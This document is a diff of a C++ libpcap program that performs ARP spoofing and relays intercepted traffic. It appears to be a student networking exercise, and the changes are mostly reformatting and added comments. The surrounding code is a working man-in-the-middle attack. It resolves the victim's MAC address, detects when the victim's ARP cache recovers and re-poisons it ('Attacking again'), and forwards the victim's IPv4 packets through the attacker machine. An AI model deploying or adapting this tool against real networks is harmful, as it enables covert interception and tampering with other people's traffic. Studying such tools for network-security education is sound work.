@@ -16,7 +16,8 @@
 #include <signal.h>
 
 #pragma pack(push, 1)
-struct EthArpPacket final {
+struct EthArpPacket final 
+{
 	EthHdr eth_;
 	ArpHdr arp_;
 };
@@ -105,12 +106,15 @@ int Target_resolve(pcap_t* handle, Edge* sender, Edge* attacker)
 	packet.arp_.tip_ = htonl(sender -> ip);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
+	//error handling
+	if (res != 0) 
+	{
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		return 1;
 	}
 
-	while (true) {
+	while (true) 
+	{
 		struct pcap_pkthdr* header;
 		const u_char* recv_packet;
 		int res = pcap_next_ex(handle, &header, &recv_packet);
@@ -121,8 +125,10 @@ int Target_resolve(pcap_t* handle, Edge* sender, Edge* attacker)
 			return 1;
 		}
 		struct EthArpPacket *conv_packet = (struct EthArpPacket *)recv_packet;
+		//check packet type
 		if(conv_packet->arp_.op() == ArpHdr::Reply && conv_packet->eth_.type() == EthHdr::Arp)
 		{
+			//check sender IP & attacker MAC
 			if(conv_packet->arp_.sip() == sender -> ip && conv_packet->arp_.tmac() == attacker -> mac)
 			{
 				sender -> mac = conv_packet -> arp_.smac();
@@ -171,9 +177,10 @@ int packet_relaying(pcap_t* handle, Args * args)
 
 	while (1) 
 	{
+		//get packet
 		res = pcap_next_ex(handle, &header, &recv_packet);
 
-		// result check
+		// packet check
 		if (res == 0) continue;
 
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
@@ -186,13 +193,17 @@ int packet_relaying(pcap_t* handle, Args * args)
 
 		struct EthArpPacket *conv_packet = (struct EthArpPacket *)recv_packet;
 
+		//validation sender mac
 		if(conv_packet -> eth_.smac() != args -> sender.mac)
 			continue;
 
+		//check header type
 		if(conv_packet->eth_.type() == EthHdr::Arp)
 		{
+			//check sender & target IP 
 			if(conv_packet -> arp_.sip() == args -> sender.ip && conv_packet -> arp_.tip() == args -> target.ip)
 			{
+				//check still spoofed
 				if(conv_packet -> eth_.dmac().isBroadcast())
 				{
 					printf("Attacking again\n");
@@ -206,6 +217,7 @@ int packet_relaying(pcap_t* handle, Args * args)
 			if(conv_packet->eth_.type() != EthHdr::Ip4)
 				continue;
 
+			//check sender MAC
 			if(conv_packet->eth_.smac() == args -> sender.mac)
 			{
 				conv_packet->eth_.smac_ = conv_packet->eth_.dmac();
@@ -218,15 +230,17 @@ int packet_relaying(pcap_t* handle, Args * args)
 			
 			std::cout << "packet_relaying(" << ctr << ") : " << std::string(args -> sender.mac) << " to " << std::string(conv_packet->eth_.dmac()) << std::endl;
 			ctr++;
+			//check packet size==1515
 			if(packet_size > 1514)
 			{
 				std::cout << "packet size is over than 1515" << std::endl;
 				continue;
 			}
 
+			//packet spoof
 			memcpy(relay_packet, recv_packet, packet_size);
 			memcpy(relay_packet, conv_packet, 14);
-
+			//send packet to target
 			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(relay_packet), packet_size);
 			if (res != 0) 
 			{
@@ -294,10 +308,12 @@ int main(int argc, char* argv[])
 		(args + i) -> handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 		(args + i) -> sender.ip = Ip(argv[i * 2 + 2]);
 		(args + i) -> target.ip = Ip(argv[i * 2 + 3]);
-		if ((args + i) -> handle == nullptr) {
+		if ((args + i) -> handle == nullptr) 
+		{
 			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 			return -1;
 		}
+
 		if(pthread_create(&threads[i], NULL, threader, (void*)(args + i)) != 0)
 		{
 			printf("pthread_create error\n");
